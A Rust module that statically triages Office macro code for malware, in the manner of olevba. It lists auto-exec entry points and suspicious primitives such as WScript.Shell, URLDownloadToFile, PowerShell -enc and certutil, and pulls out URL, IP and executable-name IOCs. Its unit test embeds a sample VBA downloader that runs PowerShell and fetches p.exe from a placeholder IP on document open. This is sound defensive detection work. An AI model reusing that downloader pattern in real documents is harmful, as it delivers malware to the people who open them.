//! Static triage of macro source code (never executed).
//!
//! Inspired by the keyword families of `olevba`: auto-execution entry points,
//! execution / download / persistence / obfuscation primitives and IOCs.

use crate::report::MacroLanguage;

/// Result of analysing one module.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub(crate) struct Analysis {
    pub(crate) auto_exec: Vec<String>,
    pub(crate) suspicious: Vec<String>,
    pub(crate) iocs: Vec<String>,
}

/// VBA procedure names Office runs automatically.
const VBA_AUTO_EXEC: &[&str] = &[
    "autoexec",
    "autoopen",
    "autoclose",
    "autoexit",
    "autonew",
    "document_open",
    "document_close",
    "document_new",
    "document_beforeclose",
    "document_contentcontrolonenter",
    "document_contentcontrolonexit",
    "documentopen",
    "documentbeforeclose",
    "newdocument",
    "auto_open",
    "auto_close",
    "auto_activate",
    "auto_deactivate",
    "workbook_open",
    "workbook_activate",
    "workbook_beforeclose",
    "workbook_deactivate",
    "workbook_beforesave",
    "workbook_sheetactivate",
    "workbook_windowactivate",
    "worksheet_activate",
    "worksheet_change",
    "worksheet_calculate",
    "worksheet_selectionchange",
    "worksheet_followhyperlink",
    "app_workbookopen",
    "app_documentopen",
    "app_newdocument",
    "document_documentopened",
    "document_beforedocumentclose",
    "visiodocument_documentopened",
    "application_startup",
    "presentation_open",
    "onslideshowpagechange",
];

/// Suffixes of ActiveX/form event handlers that fire without a deliberate click.
const VBA_AUTO_EVENT_SUFFIXES: &[&str] = &[
    "_painted",
    "_layout",
    "_resize",
    "_gotfocus",
    "_lostfocus",
    "_mousehover",
    "_mousemove",
    "_mouseenter",
    "_initialize",
    "_change",
    "_beforenavigate2",
    "_navigatecomplete2",
    "_documentcomplete",
];

/// `(needle, label)` pairs, matched case-insensitively.
const VBA_SUSPICIOUS: &[(&str, &str)] = &[
    ("shell(", "Shell"),
    ("shell ", "Shell"),
    ("wscript.shell", "WScript.Shell"),
    ("shell.application", "Shell.Application"),
    ("shellexecute", "ShellExecute"),
    ("createobject", "CreateObject"),
    ("getobject", "GetObject"),
    ("callbyname", "CallByName"),
    ("environ", "Environ"),
    ("urldownloadtofile", "URLDownloadToFile"),
    ("xmlhttp", "XMLHTTP"),
    ("winhttp", "WinHttp"),
    ("msxml2", "MSXML2"),
    ("adodb.stream", "ADODB.Stream"),
    ("savetofile", "SaveToFile"),
    ("powershell", "PowerShell"),
    ("cmd.exe", "cmd.exe"),
    ("cmd /c", "cmd /c"),
    ("mshta", "mshta"),
    ("rundll32", "rundll32"),
    ("regsvr32", "regsvr32"),
    ("certutil", "certutil"),
    ("bitsadmin", "bitsadmin"),
    ("schtasks", "schtasks"),
    ("wmic", "wmic"),
    ("winmgmts", "WMI (winmgmts)"),
    ("win32_process", "Win32_Process"),
    ("scripting.filesystemobject", "FileSystemObject"),
    ("createtextfile", "CreateTextFile"),
    ("regwrite", "RegWrite"),
    ("regread", "RegRead"),
    ("virtualalloc", "VirtualAlloc"),
    ("virtualprotect", "VirtualProtect"),
    ("rtlmovememory", "RtlMoveMemory"),
    ("createthread", "CreateThread"),
    ("writeprocessmemory", "WriteProcessMemory"),
    ("lib \"kernel32", "Declare ... Lib kernel32"),
    ("lib \"user32", "Declare ... Lib user32"),
    ("lib \"ntdll", "Declare ... Lib ntdll"),
    ("lib \"urlmon", "Declare ... Lib urlmon"),
    ("lib \"libc.dylib", "Declare ... Lib libc (macOS)"),
    ("macscript", "MacScript"),
    ("appleScripttask", "AppleScriptTask"),
    ("executeexcel4macro", "ExecuteExcel4Macro"),
    ("application.run", "Application.Run"),
    ("application.ontime", "Application.OnTime"),
    ("sendkeys", "SendKeys"),
    ("vbproject", "VBProject (self-modifying code)"),
    ("addfromstring", "AddFromString"),
    ("addfromfile", "AddFromFile"),
    ("strreverse", "StrReverse (obfuscation)"),
    ("chrw(", "ChrW (obfuscation)"),
    ("chrb(", "ChrB (obfuscation)"),
    ("frombase64string", "Base64 decoding"),
    ("base64", "Base64"),
    ("-encodedcommand", "PowerShell -EncodedCommand"),
    ("-enc ", "PowerShell -enc"),
    (".variables(", "Document variables (hidden payload store)"),
    ("customdocumentproperties", "CustomDocumentProperties (hidden payload store)"),
    ("kill ", "Kill (file deletion)"),
    ("filecopy", "FileCopy"),
    ("put #", "binary file write"),
    ("for binary", "Open ... For Binary"),
    ("for output", "Open ... For Output"),
];

const XLM_SUSPICIOUS: &[(&str, &str)] = &[
    ("exec(", "EXEC"),
    ("call(", "CALL"),
    ("register(", "REGISTER"),
    ("register.id(", "REGISTER.ID"),
    ("run(", "RUN"),
    ("formula(", "FORMULA"),
    ("formula.fill(", "FORMULA.FILL"),
    ("fopen(", "FOPEN"),
    ("fwrite(", "FWRITE"),
    ("fwriteln(", "FWRITELN"),
    ("urldownloadtofile", "URLDownloadToFile"),
    ("get.workspace(", "GET.WORKSPACE (sandbox evasion)"),
    ("get.window(", "GET.WINDOW"),
    ("get.cell(", "GET.CELL"),
    ("workbook.hide(", "WORKBOOK.HIDE"),
    ("set.name(", "SET.NAME"),
    ("halt(", "HALT"),
    ("char(", "CHAR (obfuscation)"),
    ("shellexecute", "ShellExecute"),
    ("powershell", "PowerShell"),
    ("mshta", "mshta"),
    ("rundll32", "rundll32"),
];

const BASIC_SUSPICIOUS: &[(&str, &str)] = &[
    ("shell(", "Shell"),
    ("shell ", "Shell"),
    ("systemshellexecute", "SystemShellExecute"),
    ("createunoservice", "CreateUnoService"),
    ("com.sun.star.system", "com.sun.star.system"),
    ("subprocess", "subprocess"),
    ("os.system", "os.system"),
    ("os.popen", "os.popen"),
    ("eval(", "eval"),
    ("exec(", "exec"),
    ("runtime.getruntime", "Runtime.exec"),
    ("powershell", "PowerShell"),
    ("urllib", "urllib"),
    ("http.client", "http.client"),
];

const EXEC_EXTENSIONS: &[&str] = &[
    "exe", "dll", "scr", "pif", "com", "cpl", "msi", "bat", "cmd", "ps1", "vbs", "vbe", "js",
    "jse", "wsf", "wsh", "hta", "jar", "lnk", "sct", "xll", "iso", "img",
];

/// Analyses `source` in `language`.
pub(crate) fn analyze(source: &str, language: MacroLanguage) -> Analysis {
    let lower = source.to_ascii_lowercase();
    let mut a = Analysis::default();
    match language {
        MacroLanguage::Vba => {
            for proc in procedure_names(&lower) {
                if VBA_AUTO_EXEC.contains(&proc.as_str())
                    || VBA_AUTO_EVENT_SUFFIXES.iter().any(|s| proc.ends_with(s))
                {
                    push_unique(&mut a.auto_exec, original_case(source, &proc));
                }
            }
            keywords(&lower, VBA_SUSPICIOUS, &mut a.suspicious);
        }
        MacroLanguage::Xlm => keywords(&lower, XLM_SUSPICIOUS, &mut a.suspicious),
        MacroLanguage::StarBasic
        | MacroLanguage::Python
        | MacroLanguage::JavaScript
        | MacroLanguage::BeanShell => {
            for proc in procedure_names(&lower) {
                if matches!(proc.as_str(), "main" | "onload" | "autoexec") {
                    push_unique(&mut a.auto_exec, original_case(source, &proc));
                }
            }
            keywords(&lower, BASIC_SUSPICIOUS, &mut a.suspicious);
        }
    }
    for url in crate::url::find_urls(source, 32) {
        push_unique(&mut a.iocs, url);
    }
    for ip in find_ipv4(source, 16) {
        push_unique(&mut a.iocs, ip);
    }
    for name in find_exec_names(&lower, 16) {
        push_unique(&mut a.iocs, name);
    }
    a
}

fn push_unique(v: &mut Vec<String>, s: String) {
    if !v.contains(&s) {
        v.push(s);
    }
}

fn keywords(lower: &str, table: &[(&str, &str)], out: &mut Vec<String>) {
    for (needle, label) in table {
        if lower.contains(&needle.to_ascii_lowercase()) {
            push_unique(out, (*label).to_owned());
        }
    }
}

/// Names of `Sub`/`Function` definitions (lowercased).
fn procedure_names(lower: &str) -> Vec<String> {
    let mut out = Vec::new();
    for line in lower.lines() {
        let mut t = line.trim_start();
        for prefix in ["private ", "public ", "friend ", "static "] {
            if let Some(rest) = t.strip_prefix(prefix) {
                t = rest.trim_start();
            }
        }
        let rest = t
            .strip_prefix("sub ")
            .or_else(|| t.strip_prefix("function "))
            .or_else(|| t.strip_prefix("def "));
        if let Some(rest) = rest {
            let name: String = rest
                .trim_start()
                .chars()
                .take_while(|c| c.is_alphanumeric() || *c == '_')
                .collect();
            if !name.is_empty() && out.len() < 4096 {
                out.push(name);
            }
        }
    }
    out
}

fn original_case(source: &str, lower_name: &str) -> String {
    let lower = source.to_ascii_lowercase();
    lower
        .find(lower_name)
        .and_then(|i| source.get(i..i + lower_name.len()))
        .unwrap_or(lower_name)
        .to_owned()
}

fn find_ipv4(text: &str, max: usize) -> Vec<String> {
    let mut out = Vec::new();
    for token in text.split(|c: char| !(c.is_ascii_digit() || c == '.')) {
        if out.len() >= max {
            break;
        }
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() == 4
            && parts
                .iter()
                .all(|p| !p.is_empty() && p.len() <= 3 && p.parse::<u16>().is_ok_and(|v| v <= 255))
            && token != "0.0.0.0"
            && !token.starts_with("1.0.")
        {
            push_unique(&mut out, token.to_owned());
        }
    }
    out
}

fn find_exec_names(lower: &str, max: usize) -> Vec<String> {
    let mut out = Vec::new();
    for token in lower.split(|c: char| {
        c.is_whitespace() || matches!(c, '"' | '\'' | '(' | ')' | ',' | '\\' | '/' | '&' | '=')
    }) {
        if out.len() >= max {
            break;
        }
        if let Some((stem, ext)) = token.rsplit_once('.')
            && !stem.is_empty()
            && stem.chars().all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | '%' | '$'))
            && EXEC_EXTENSIONS.contains(&ext)
        {
            push_unique(&mut out, token.to_owned());
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classic_downloader_is_triaged() {
        let src = "Attribute VB_Name = \"ThisDocument\"\r\nPrivate Sub Document_Open()\r\n  Set x = CreateObject(\"WScript.Shell\")\r\n  x.Run \"powershell -enc AAAA\"\r\n  URLDownloadToFile 0, \"http://203.0.113.7/p.exe\", Environ(\"TEMP\") & \"\\p.exe\", 0, 0\r\nEnd Sub\r\nSub CommandButton1_Click()\r\nEnd Sub\r\nSub InkPicture1_Painted()\r\nEnd Sub";
        let a = analyze(src, MacroLanguage::Vba);
        assert_eq!(a.auto_exec, vec!["Document_Open".to_owned(), "InkPicture1_Painted".to_owned()]);
        for k in ["CreateObject", "WScript.Shell", "PowerShell", "URLDownloadToFile", "Environ"] {
            assert!(a.suspicious.iter().any(|s| s == k), "{k} missing in {:?}", a.suspicious);
        }
        assert!(a.iocs.contains(&"http://203.0.113.7/p.exe".to_owned()));
        assert!(a.iocs.contains(&"203.0.113.7".to_owned()));
        assert!(a.iocs.iter().any(|i| i == "p.exe"));
    }

    #[test]
    fn benign_module_is_quiet() {
        let a =
            analyze("Sub FormatTable()\n Selection.Font.Bold = True\nEnd Sub", MacroLanguage::Vba);
        assert!(a.auto_exec.is_empty() && a.suspicious.is_empty() && a.iocs.is_empty(), "{a:?}");
    }

    #[test]
    fn xlm_keywords() {
        let a = analyze("=EXEC(\"calc.exe\")\n=HALT()", MacroLanguage::Xlm);
        assert!(a.suspicious.contains(&"EXEC".to_owned()));
        assert!(a.suspicious.contains(&"HALT".to_owned()));
        assert!(a.iocs.contains(&"calc.exe".to_owned()));
    }
}
